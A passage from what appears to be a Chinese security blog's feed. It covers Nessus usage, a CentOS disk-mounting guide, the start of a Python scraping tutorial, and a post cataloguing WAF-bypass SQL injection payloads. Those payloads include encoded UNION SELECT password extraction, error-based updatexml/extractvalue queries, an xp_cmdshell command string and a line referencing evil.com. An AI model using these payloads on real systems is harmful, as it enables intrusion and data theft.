successful"></p><h4 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h4><p>在“ 扫描”页面上，您可以创建，查看和管理扫描和资源。要访问“ 扫描”页面，请在顶部导航栏中单击“ 扫描”。左侧导航栏显示文件夹和资源两部分。</p><p><img src="\images\pasted-155.png" alt="upload successful"></p><h4 id="文件夹"><a href="#文件夹" class="headerlink" title="文件夹"></a>文件夹</h4><p>文件夹”部分始终包含以下不能删除的默认文件夹：我的扫描、所有扫描、垃圾桶。</p><p>当您访问“ 扫描”页面时，将显示“ 我的扫描”文件夹。当您创建扫描时，它默认显示在“ 我的扫描”文件夹中。</p><p>在所有扫描的文件夹显示所创建的所有扫描以及与有权限进行交互的任何扫描。可以点击文件夹中的扫描来查看扫描结果。</p><p>垃圾桶”文件夹显示已删除的扫描。可以从Nessus实例中永久删除扫描，或将扫描恢复到选定的文件夹。如果删除包含扫描的文件夹，则该文件夹中的所有扫描都将移至”垃圾桶”文件夹。存储在“ 垃圾箱”文件夹中的扫描将在30天后自动删除。</p><p><img src="\images\pasted-156.png" alt="upload successful"></p><h4 id="插件规则"><a href="#插件规则" class="headerlink" title="插件规则"></a>插件规则</h4><p>允许隐藏或改变任何给定的插件的严重性。另外，规则可以限制在特定的主机或特定的时间范围内。在此页面上，可以查看，创建，编辑和删除规则。</p><p><img src="\images\pasted-157.png" alt="upload successful"></p><h4 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h4><p>该扫描器页面显示的链接键和遥控器的扫描器列表。您可以点击链接的扫描器查看有关该扫描器的详细信息。</p><p>扫描器由扫描器类型标识，并指示扫描器是否具有共享权限。</p><p>可以使用链接密钥或有效帐户凭证将远程扫描器链接到Nessus Manager。一旦链接，扫描器可以在本地进行管理，并在配置扫描时进行选择。</p><p><img src="\images\pasted-158.png" alt="upload successful"></p><h4 id="扫描模板"><a href="#扫描模板" class="headerlink" title="扫描模板"></a>扫描模板</h4><p>可用的模板可能会有所不同。Nessus界面提供产品中每个模板的简要说明</p><p><img src="\images\pasted-159.png" alt="upload successful"></p><h4 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h4><p>每个策略都存在以下设置，但可用的配置项目可能因所选模板而异：</p><p><img src="\images\pasted-160.png" alt="upload successful"></p><h4 id="凭证"><a href="#凭证" class="headerlink" title="凭证"></a>凭证</h4><p>每个策略都存在以下设置，但可用的配置项目可能因所选模板而异：</p><h4 id="云服务"><a href="#云服务" class="headerlink" title="云服务"></a>云服务</h4><p>数据库：包括MongoDB，Oracle，MySQL，DB2，PostgreSQL和SQL Server</p><p>主机：其中包括Windows登录，SSH和SNMPv3</p><p>其他服务：VMware，Red Hat Enterprise Virtualization等</p><p>明文身份验证机制：包括FTP，HTTP，POP3和其他服务</p><p><img src="\images\pasted-161.png" alt="upload successful"></p><h4 id="合规检测"><a href="#合规检测" class="headerlink" title="合规检测"></a>合规检测</h4><p>Nessus可以执行网络服务的漏洞扫描以及登录到服务器以发现任何缺少的补丁。没有漏洞并不意味着服务器配置是正确的，或者与特定标准要求“相符</p><p><img src="\images\pasted-162.png" alt="upload successful"></p><h4 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h4><p>插件选项可以选择插件系列的安全检查或单个插件检查</p><p><img src="\images\pasted-163.png" alt="upload successful"></p><h4 id="SMTP服务"><a href="#SMTP服务" class="headerlink" title="SMTP服务"></a>SMTP服务</h4><p>SMTP服务器页面显示允许您配置简单邮件传输协议（SMTP）服务器的选项。当您配置SMTP服务器时，Nessus会将扫描结果通过电子邮件发送到您指定的收件人列表。</p><p><img src="\images\pasted-164.png" alt="upload successful"></p><h4 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h4><p>在此页面上，可以查看，创建，编辑和删除用户。一旦创建，用户就配置了一个角色，角色决定了用户的扫描器权限。</p><p><img src="\images\pasted-165.png" alt="upload successful"></p><h4 id="扫描报告"><a href="#扫描报告" class="headerlink" title="扫描报告"></a>扫描报告</h4><p>点击扫描结果文件夹，选择要下载的扫描任务</p><p><img src="\images\pasted-170.png" alt="upload successful"><br>选择下载目标，点击左上角输出，选择输出文件格式。</p><p><img src="\images\pasted-171.png" alt="upload successful"></p><h1 id="启动或停止Nessus"><a href="#启动或停止Nessus" class="headerlink" title="启动或停止Nessus"></a>启动或停止Nessus</h1><h4 id="windows下"><a href="#windows下" class="headerlink" title="windows下"></a>windows下</h4><p><img src="\images\pasted-166.png" alt="upload successful"></p><h4 id="linux下"><a href="#linux下" class="headerlink" title="linux下"></a>linux下</h4><p><img src="\images\pasted-167.png" alt="upload successful"></p><p><img src="\images\pasted-168.png" alt="upload successful"></p><p>参数</p><p><img src="\images\pasted-169.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="安全工具" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入绕过</title>
    <link href="http://yoursite.com/2018/08/27/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/"/>
    <id>http://yoursite.com/2018/08/27/SQL注入绕过/</id>
    <published>2018-08-27T12:22:05.000Z</published>
    <updated>2018-08-28T03:59:48.355Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-172.png" alt="upload successful"></p><h2 id="0x1-WAF的常见特征"><a href="#0x1-WAF的常见特征" class="headerlink" title="0x1 WAF的常见特征"></a>0x1 WAF的常见特征</h2><p> 之所以要谈到WAF的常见特征，是为了更好的了解WAF的运行机制，这样就能增加几分绕过的机会了。本文不对WAF做详细介绍，只谈及几点相关的。</p><p> 总体来说，WAF(Web Application Firewall)的具有以下四个方面的功能：</p><ol><li><p>审计设备：用来截获所有HTTP数据或者仅仅满足某些规则的会话</p></li><li><p>访问控制设备：用来控制对<a href="http://www.moonsec.com/tag/Web" target="_blank" rel="noopener">Web</a>应用的访问，既包括主动安全模式也包括被动安全模式</p></li><li><p><a href="http://lib.csdn.net/base/architecture" target="_blank" rel="noopener">架构</a>/网络设计工具：当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。</p></li><li><p>WEB应用加固工具：这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且能够保护WEB应用编程错误导致的安全隐患。</p></li></ol><h2 id="WAF的常见特点："><a href="#WAF的常见特点：" class="headerlink" title="WAF的常见特点："></a>WAF的常见特点：</h2><p> 异常检测协议：拒绝不符合HTTP标准的请求</p><p> 增强的输入验证：代理和服务端的验证，而不只是限于客户端验证</p><p> 白名单&amp;黑名单：白名单适用于稳定的We应用，黑名单适合处理已知问题</p><p> 基于规则和基于异常的保护：基于规则更多的依赖黑名单机制，基于异常更为灵活</p><p> 状态管理：重点进行会话保护</p><p> 另还有：Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等</p><p> 如果是对于扫描器，WAF有其识别之道：</p><p> 扫描器识别主要由以下几点：</p><p> 1) 扫描器指纹(head字段/请求参数值)，以wvs为例，会有很明显的Acunetix在内的标识</p><p> 2)  单IP+ cookie某时间段内触发规则次数</p><p> 3)  隐藏的链接标签等(<a>)</a></p><p> 4)  Cookie植入</p><p> 5)  验证码验证，扫描器无法自动填充验证码</p><p> 6)  单IP请求时间段内<a href="http://www.moonsec.com/tag/Web" target="_blank" rel="noopener">Web</a>server返回http状态404比例， 扫描器探测敏感目录基于字典，找不到文件则返回404</p><h2 id="0x2-绕过WAF的方法"><a href="#0x2-绕过WAF的方法" class="headerlink" title="0x2 绕过WAF的方法"></a>0x2 绕过WAF的方法</h2><p>  从目前能找到的资料来看，我把这些绕过waf的技术分为9类，包含从初级到高级技巧</p><p> a) 大小写混合</p><p> b)替换关键字</p><p> c)使用编码</p><p> d)使用注释</p><p> e)等价函数与命令</p><p> f)特殊符号</p><p> g)HTTP参数控制</p><p> h)缓冲区溢出</p><p> i)整合绕过</p><h4 id="a-大小写绕过"><a href="#a-大小写绕过" class="headerlink" title="a) 大小写绕过"></a>a) 大小写绕过</h4><p> 大小写绕过用于只针对小写或大写的关键字匹配技术，正则表达式/express/i 大小写不敏感即无法<a href="http://www.moonsec.com/tag/%E7%BB%95%E8%BF%87" target="_blank" rel="noopener">绕过</a>，这是最简单的绕过技术</p><p> 举例：z.com/index.<a href="http://lib.csdn.net/base/php" target="_blank" rel="noopener">PHP</a>?page_id=-15 uNIoN sELecT 1,2,3,4 </p><p> 示例场景可能的情况为filter的规则里有对大小写转换的处理，但不是每个关键字或每种情况都有处理</p><h4 id="b-替换关键字"><a href="#b-替换关键字" class="headerlink" title="b)替换关键字"></a>b)替换关键字</h4><p> 这种情况下大小写转化无法绕过，而且正则表达式会替换或删除select、union这些关键字，如果只匹配一次就很容易绕过</p><p> 举例：z.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4</p><p> 同样是很基础的技术，有些时候甚至构造得更复杂：SeLSeselectleCTecT，不建议对此抱太大期望</p><p>c)使用编码</p><p> 1.URL编码</p><p> 在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28、右括号%29</p><p> 普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过：page.php?id=1%252f%252a*/UNION%252f%252a /SELECT</p><p> 2.十六进制编码</p><p> 举例：z.com/index.php?page_id=-15 /<em>!u%6eion</em>/ /<em>!se%6cect</em>/ 1,2,3,4…</p><p> 　　　SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</p><p> 示例代码中，前者是对单个字符十六进制编码，后者则是对整个字符串编码，使用上来说较少见一点</p><p> 3.Unicode编码</p><p> Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了</p><p> 看一下常用的几个符号的一些Unicode编码：</p><p> 单引号:   %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</p><p> 空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</p><p> 左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</p><p> 右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</p><p> 举例：?id=10%D6‘%20AND%201=2%23　　</p><p> 　　　SELECT ‘Ä’=’A’; #1</p><p> 两个示例中，前者利用双字节绕过，比如对单引号转义操作变成\’，那么就变成了%D6%5C’，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用</p><p> 第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过</p><p> 另外平时听得多一点的可能是utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过，有兴趣的朋友可以去了解下</p><p> 常见的编码当然还有二进制、八进制，它们不一定都派得上用场，但后面会提到使用二进制的例子</p><h4 id="d-使用注释"><a href="#d-使用注释" class="headerlink" title="d) 使用注释"></a>d) 使用注释</h4><p> 看一下常见的用于注释的符号有哪些：//, – , /**/, #, –+,–  -, ;，–a</p><p> 1.普通注释</p><p> 举例：z.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4　　　</p><p> 　　　‘union%a0select pass from users#</p><p> /**/在构造得查询语句中插入注释，规避对空格的依赖或关键字识别;#、–+用于终结语句的查询</p><p> 2.内联注释</p><p> 相比普通注释，内联注释用的更多，它有一个特性/!**/只有<a href="http://lib.csdn.net/base/mysql" target="_blank" rel="noopener">MySQL</a>能识别</p><p> 举例：index.php?page_id=-15 /<em>!UNION</em>/ /<em>!SELECT</em>/ 1,2,3</p><p> 　　　?page_id=null%0A/<strong>//<em>!50000%55nIOn</em>//<em>yoyu</em>/all/</strong>/%0A/<em>!%53eLEct</em>/%0A/<em>nnaa</em>/+1,2,3,4…</p><p> 两个示例中前者使用内联注释，后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分，要做到这一点后面讨论的特殊符号也能实现，当然前提是包括/、*在内的这些字符能正常使用</p><h4 id="e-等价函数与命令"><a href="#e-等价函数与命令" class="headerlink" title="e)等价函数与命令"></a>e)等价函数与命令</h4><p> 有些函数或命令因其关键字被检测出来而无法使用，但是在很多情况下可以使用与之等价或类似的代码替代其使用</p><p> 1.函数或变量</p><p> hex()、bin() ==&gt; ascii()</p><p> sleep() ==&gt;benchmark()</p><p> concat_ws()==&gt;group_concat()</p><p> mid()、substr() ==&gt; substring()</p><p> @@user ==&gt; user()</p><p> @@datadir ==&gt; datadir()</p><p> 举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　</p><p> 或者：substr((select ‘password’),1,1) = 0x70</p><p> 　　　strcmp(left(‘password’,1), 0x69) = 1</p><p> 　　   strcmp(left(‘password’,1), 0x70) = 0</p><p> 　　　strcmp(left(‘password’,1), 0x71) = -1</p><p> 上述这几个示例用于说明有时候当某个函数不能使用时，还可以找到其他的函数替代其实现，置于select、uinon、where等关键字被限制如何处理将在后面filter部分讨论</p><p> 2.符号</p><p> and和or有可能不能使用，或者可以试下&amp;&amp;和||能不能用；还有=不能使用的情况，可以考虑尝试&lt;、&gt;，因为如果不小于又不大于，那边是等于了</p><p> 在看一下用得多的空格，可以使用如下符号表示其作用：%20 %09 %0a %0b %0c %0d %a0 /**/</p><p> 3.生僻函数</p><p> MySQL/PostgreSQL支持XML函数：Select UpdateXML(‘<script x="_"></script> ’,’/script/@x/’,’src=//evil.com’);　　　　　　　　　　</p><p> ?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))</p><p> SELECT xmlelement(name img,xmlattributes(1as src,’a\l\x65rt(1)’as \117n\x65rror));　//postgresql</p><p> ?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</p><p> MySQL、PostgreSQL、<a href="http://lib.csdn.net/base/oracle" target="_blank" rel="noopener">Oracle</a>它们都有许多自己的函数，基于黑名单的filter要想涵盖这么多东西从实际上来说不太可能，而且代价太大，看来黑名单技术到一定程度便遇到了限制</p><h4 id="f-特殊符号"><a href="#f-特殊符号" class="headerlink" title="f) 特殊符号"></a>f) 特殊符号</h4><p> 这里我把非字母数字的字符都规在了特殊符号一类，特殊符号有特殊的含义和用法，涉及信息量比前面提到的几种都要多</p><p> 先看下乌云drops上“waf的绕过技巧”一文使用的几个例子：</p><p> 1.使用反引号<code>，例如select</code>version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用</p><p> 2.神奇的”-+.”，select+id-1+1.from users; “+”是用于字符串连接的，”-”和”.”在此也用于连接，可以逃过空格和关键字过滤</p><p> 3.@符号，select@^1.from users; @用于变量定义如<strong>@**</strong>var_name**，一个@表示用户定义，@@表示系统变量</p><p> 4.Mysql function() as xxx  也可不用as和空格　　 select-count(id)test from users;  //绕过空格限制</p><p> 可见，使用这些字符的确是能做很多事，也证实了那句老话，只有想不到，没有做不到</p><p> 本人搜罗了部分可能发挥大作用的字符(未包括’、*、/等在内，考虑到前面已经出现较多次了)：`、~、!、@、%、()、[]、.、-、+ 、|、%00</p><p> 举例：</p><p> 关键字拆分：‘se’+’lec’+’t’</p><p> 　　　　　　%S%E%L%E%C%T 1</p><p> 　　　　　　1.aspx?id=1;EXEC(‘ma’+’ster..x’+’p_cm’+’dsh’+’ell ”net user”’)</p><p> !和()：’ or –+2=- -!!!’2</p><p>  　　　 id=1+(UnI)(oN)+(SeL)(EcT)　//另 Access中,”[]”用于表和列,”()”用于数值也可以做分隔</p><p> 本节最后在给出一些和这些字符多少有点关系的操作符供参考：</p><p> >&gt;, &lt;&lt;, &gt;=, &lt;=, &lt;&gt;,&lt;=&gt;,XOR, DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN</p><p> 使用这些”特殊符号”实现绕过是一件很细微的事情，一方面各家<a href="http://lib.csdn.net/base/mysql" target="_blank" rel="noopener">数据库</a>对有效符号的处理是不一样的，另一方面你得充分了解这些符号的特性和使用方法才能作为绕过手段</p><h4 id="g-HTTP参数控制"><a href="#g-HTTP参数控制" class="headerlink" title="g) HTTP参数控制"></a>g) HTTP参数控制</h4><p> 这里HTTP参数控制除了对查询语句的参数进行篡改，还包括HTTP方法、HTTP头的控制</p><p> 1.HPP(HTTP Parameter Polution)</p><p> 举例：/?id=1;select+1,2,3+from+users+where+id=1—</p><p> 　　　/?id=1;select+1&amp;id=2,3+from+users+where+id=1—</p><p> 　　　/?id=1/*<em>/union/</em>&amp;id=<em>/select/</em>&amp;id=<em>/pwd/</em>&amp;id=<em>/from/</em>&amp;id=*/users</p><p> 2.HPF(HTTP Parameter Fragment)</p><p> 这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行)</p><p> 举例：　</p><p> 　　/?a=1+union/<em>&amp;b=</em>/select+1,pass/<em>&amp;c=</em>/from+users–</p><p> 　　select <em> from table where a=1 union/</em> and b=<em>/select 1,pass/</em> limit */from users—</p><p> 看罢上面两个示例，发现和HPP最后一个示例很像，不同之处在于参数不一样，这里是在不同的参数之间进行分割，到了数据库执行查询时再合并语句。</p><p> 3.HPC(HTTP Parameter Contamination)</p><p> 这一概念见于exploit-db上的paper：Beyond SQLi: Obfuscate and Bypass，Contamination同样意为污染</p><p> RFC2396定义了如下一些字符：</p><p> Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ‘ ()<br> Reserved : ; / ? : @ &amp; = + $ ,<br> Unwise : { } | \ ^ [ ] `</p><h4 id="h-缓冲区溢出-Advanced"><a href="#h-缓冲区溢出-Advanced" class="headerlink" title="h) 缓冲区溢出(Advanced)"></a>h) 缓冲区溢出(Advanced)</h4><p> 缓冲区溢出用于对付WAF，有不少WAF是<a href="http://lib.csdn.net/base/c" target="_blank" rel="noopener">C语言</a>写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过</p><p> 举例：</p><p> ?id=1 and (select 1)=(Select  0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</p><p> 示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出</p><h4 id="i-整合绕过"><a href="#i-整合绕过" class="headerlink" title="i) 整合绕过"></a>i) 整合绕过</h4><p>整合的意思是结合使用前面谈到的各种绕过技术，单一的技术可能无法绕过过滤机制，但是多种技术的配合使用成功的可能性就会增加不少了。这一方面来说  是总体与局部和的关系，另一方面则是多种技术的使用创造了更多的可能性，除非每一种技术单独都无法使用，否则它们能产生比自身大得多的能量。</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>centos7初始化硬盘分区、挂载</title>
    <link href="http://yoursite.com/2018/08/26/%E2%80%9Ccentos7-%E5%88%9D%E5%A7%8B%E5%8C%96%E7%A1%AC%E7%9B%98%E5%88%86%E5%8C%BA%E3%80%81%E6%8C%82%E8%BD%BD/"/>
    <id>http://yoursite.com/2018/08/26/“centos7-初始化硬盘分区、挂载/</id>
    <published>2018-08-26T13:30:05.000Z</published>
    <updated>2018-08-26T14:57:37.988Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-135.png" alt="upload successful"></p><h2 id="linux硬盘知识："><a href="#linux硬盘知识：" class="headerlink" title="linux硬盘知识："></a>linux硬盘知识：</h2><p>linux下硬盘设备名为（IDE硬盘为hdx（x为从a—d）因为IDE硬盘最多四个，SCSI，SATA，USB硬盘为sdx（x为a—z）），硬盘主分区最多为4个.所以主分区从sdb1开始到sdb4，其中sdb4为扩展分区，逻辑分区从sdb5开始，（逻辑分区永远从sdb5开始…）设备名可以使用fdisk –l查看</p><h2 id="开始分区"><a href="#开始分区" class="headerlink" title="开始分区"></a>开始分区</h2><h4 id="1-查看新增磁盘信息"><a href="#1-查看新增磁盘信息" class="headerlink" title="1.查看新增磁盘信息"></a>1.查看新增磁盘信息</h4><p> <code>lsblk</code></p><p><img src="\images\pasted-137.png" alt="upload successful"></p><h4 id="2-查看分区信息"><a href="#2-查看分区信息" class="headerlink" title="2.查看分区信息"></a>2.查看分区信息</h4><p><code>fdisk -l</code></p><p><img src="\images\pasted-138.png" alt="upload successful"></p><h4 id="3-将sdb分区，键入m获取帮助"><a href="#3-将sdb分区，键入m获取帮助" class="headerlink" title="3.将sdb分区，键入m获取帮助"></a>3.将sdb分区，键入m获取帮助</h4><p><img src="\images\pasted-139.png" alt="upload successful"></p><h4 id="4-键入n添加新的分区"><a href="#4-键入n添加新的分区" class="headerlink" title="4.键入n添加新的分区"></a>4.键入n添加新的分区</h4><p>p表示主分区，e表示扩展分区</p><p><img src="\images\pasted-140.png" alt="upload successful"></p><h4 id="5-创建主分区"><a href="#5-创建主分区" class="headerlink" title="5.创建主分区"></a>5.创建主分区</h4><p><img src="\images\pasted-141.png" alt="upload successful"><br>第一条红框处按回车就好了，第二条红框处，我想设2G的一个空间，键入+2G</p><p>继续设置第二个主分区大小2G，第三个主分区大小3G</p><p><img src="\images\pasted-142.png" alt="upload successful"></p><h4 id="6-创建扩展分区"><a href="#6-创建扩展分区" class="headerlink" title="6.创建扩展分区"></a>6.创建扩展分区</h4><p>创建第四个分区为扩展分区</p><p><img src="\images\pasted-143.png" alt="upload successful"></p><h4 id="7-创建逻辑分区"><a href="#7-创建逻辑分区" class="headerlink" title="7.创建逻辑分区"></a>7.创建逻辑分区</h4><p>创建第五个分区为逻辑分区</p><p><img src="\images\pasted-144.png" alt="upload successful"><br>完成后一定要w进行写入磁盘并退出，否则上面的操作将白费</p><p><img src="\images\pasted-145.png" alt="upload successful"></p><h2 id="对分区操作"><a href="#对分区操作" class="headerlink" title="对分区操作"></a>对分区操作</h2><h4 id="1-查看分区情况"><a href="#1-查看分区情况" class="headerlink" title="1.查看分区情况"></a>1.查看分区情况</h4><p><img src="\images\pasted-146.png" alt="upload successful"></p><h4 id="2-删除分区"><a href="#2-删除分区" class="headerlink" title="2.删除分区"></a>2.删除分区</h4><p>删除分区5即逻辑分区</p><p><img src="\images\pasted-147.png" alt="upload successful"></p><h4 id="3-格式化分区"><a href="#3-格式化分区" class="headerlink" title="3.格式化分区"></a>3.格式化分区</h4><p>首先查看文件类型  df -hT<br><code>mkfs -t ext4 /dev/sdb</code></p><p><img src="\images\pasted-148.png" alt="upload successful"></p><h2 id="挂载磁盘"><a href="#挂载磁盘" class="headerlink" title="挂载磁盘"></a>挂载磁盘</h2><h4 id="临时挂载"><a href="#临时挂载" class="headerlink" title="临时挂载"></a>临时挂载</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /data/gz</span><br><span class="line">mount /dev/sdb /data/gz</span><br><span class="line">df -hT</span><br></pre></td></tr></table></figure><p><img src="\images\pasted-150.png" alt="upload successful"><br>取消挂载就是umount<br>这种方式只临时挂载到/opt目录下，下次开机时不会自动挂载<br>注意：挂载后/opt目录下的文件会被临时删除，注意备份</p><h4 id="开机自动挂载"><a href="#开机自动挂载" class="headerlink" title="开机自动挂载"></a>开机自动挂载</h4><p>1.查询磁盘分区的UUID    <code>blkid /dev/sdb</code></p><p><img src="\images\pasted-149.png" alt="upload successful"></p><p>2.通过vim编辑<code>vim /etc/fstab/</code><br><code>UUID=870d929c-dbce-40c8-9e9e-f1933a6f422c /data/gz ext4</code><br>保存<br>3.重启，查看 <code>df-hT</code></p><p><img src="\images\pasted-151.png" alt="upload successful"><br>自动挂载成功</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="运维" scheme="http://yoursite.com/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="运维" scheme="http://yoursite.com/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>抓取数据的方式</title>
    <link href="http://yoursite.com/2018/08/26/%E7%94%A8python%E5%86%99%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/"/>
    <id>http://yoursite.com/2018/08/26/用python写网络爬虫/</id>
    <published>2018-08-26T06:32:29.000Z</published>
    <updated>2018-09-03T07:19:34.866Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><h1 id="网络爬虫简介"><a href="#网络爬虫简介" class="headerlink" title="网络爬虫简介"></a>网络爬虫简介</h1><h4 id="爬虫是否合法"><a href="#爬虫是否合法" class="headerlink" title="爬虫是否合法"></a>爬虫是否合法</h4><p>当抓 取的数据是现实生活中的真实数据（比如，营业地址、 电话清 单） 时， 是允许转载的。 但是， 如果是原创数据 （比如， 意见和评论）， 通常就会受到版权限制， 而不能转载</p><h4 id="爬虫的便利"><a href="#爬虫的便利" class="headerlink" title="爬虫的便利"></a>爬虫的便利</h4><p>重复的手工可以用爬虫的自动化实现</p><h4 id="检查robots-txt"><a href="#检查robots-txt" class="headerlink" title="检查robots.txt"></a>检查robots.txt</h4><p>大多数网站 都会定义robots.txt文件， 这样可以让爬虫了解爬取该网站时存在哪些限制</p><h4 id="检查网站地图"><a href="#检查网站地图" class="headerlink" title="检查网站地图"></a>检查网站地图</h4><p>网站提供的Sitemap 文件 （即网 站 地图） 可以帮助爬虫定位网 站 最新的内 容，而无须爬 取每 一 个网页</p><h4 id="估算网站大小"><a href="#估算网站大小" class="headerlink" title="估算网站大小"></a>估算网站大小</h4><p>我们可以通过Goo gle搜索 的s ite 关键词过滤域名结果， 从而获取该 信息。 我们可以从 htt p: //www. google.<br>com/adva口ced search 了解到该 接口及其他高级搜索 参数的用法。</p><p>使用site 关键词对示例网 站 进行 搜索 的结果， 即在Goo g le中 搜索 s ite: exam ple. webscra ping. com</p><h4 id="识别网站所用技术"><a href="#识别网站所用技术" class="headerlink" title="识别网站所用技术"></a>识别网站所用技术</h4><p>builtwith 模块。 该模块的安装方法如下：</p><p>pip   install  builtwith</p><p>如何使用：</p><p>import builtwith</p><p>builtwith . parse （ ’ http : / /exaple . webscraping . com ’ ｝</p><h4 id="寻找网站所有者"><a href="#寻找网站所有者" class="headerlink" title="寻找网站所有者"></a>寻找网站所有者</h4><p>我们可以使用WHOIS协议查询域名的注册者是谁. Pyton中有一个针对该协议的封装库，其文档地址为 https: // pypi. python.org/ pypi/ python-whois ， 我们可以通过 pip进行安装。</p><p>pip install python-whois</p><p>import  whois</p><p>print  whois . whois (‘appspt . com’)</p><h4 id="编写第一个网络爬虫"><a href="#编写第一个网络爬虫" class="headerlink" title="编写第一个网络爬虫"></a>编写第一个网络爬虫</h4><h5 id="下载网页"><a href="#下载网页" class="headerlink" title="下载网页"></a>下载网页</h5><p>使用Python的urllib 2 模块下载URL。</p><p>import   urllib2<br>def   download (url ) :<br>            return   urllib2.url .open ( url ).read ( )</p><h5 id="捕获异常"><a href="#捕获异常" class="headerlink" title="捕获异常"></a>捕获异常</h5><p>import  urllib2</p><p>def  download(url):</p><pre><code>print &apos;downloading......&apos;,urltry:     html = urllib2.urlopen(url).read()except  urllib2.URLError as  e:     print  &apos;download  error:&apos; , e\.reason     html = nonereturn html</code></pre><p>当出现下载错误时， 该函数能够捕获到异常， 然后返回 None</p><h5 id="重试下载"><a href="#重试下载" class="headerlink" title="重试下载"></a>重试下载</h5><p>4xx错误发生在请求存在问题时，而5xx 错误则发生在服务端存在问题时。 所以,我们只需要确保download函数在发生5xx错误时重试下载即可</p><p>import  urllib2</p><p>def  download(url , num_retries = 2 ):</p><pre><code>print &apos;downloading......&apos;,urltry:     html = urllib2.urlopen(url).read()except  urllib2.URLError as  e:     print  &apos;download  error:&apos; , e\.reason     html = none     if   num_retries &gt; 0:           if   hasattr ( e ， ’ code ’ ） and  500 &lt;=  e . code &lt; 600:           return  download ( url , num_retries - 1 ) return   html</code></pre><h5 id="用户代理"><a href="#用户代理" class="headerlink" title="用户代理"></a>用户代理</h5><p>为避免网站有反爬技术，我们需要加上请求头以模仿浏览器请求</p><p>import  urllib2</p><p>def  download(url , num_retries = 2 ):</p><pre><code>print &apos;downloading......&apos;,url headers={&apos;user-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&apos;} request = urllib2 . Request ( url , headers =headers )try:     html = urllib2.urlopen(request).read()except  urllib2.URLError as  e:     print  &apos;download  error:&apos; , e\.reason     html = none     if   num_retries &gt; 0:           if   hasattr ( e ， ’ code ’ ） and  500 &lt;=  e . code &lt; 600:           return  download ( url , num_retries - 1 ) return   html</code></pre><h1 id="数据抓取"><a href="#数据抓取" class="headerlink" title="数据抓取"></a>数据抓取</h1><h3 id="三种网页抓取方法"><a href="#三种网页抓取方法" class="headerlink" title="三种网页抓取方法"></a>三种网页抓取方法</h3><p>首先是正则表达式 ， 然后是流行的BeautifulSoup 模块 ， 最后是强大的lxml模块</p><p>示例网站为：<a href="http://example.webscraping.com" target="_blank" rel="noopener">http://example.webscraping.com</a></p><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" 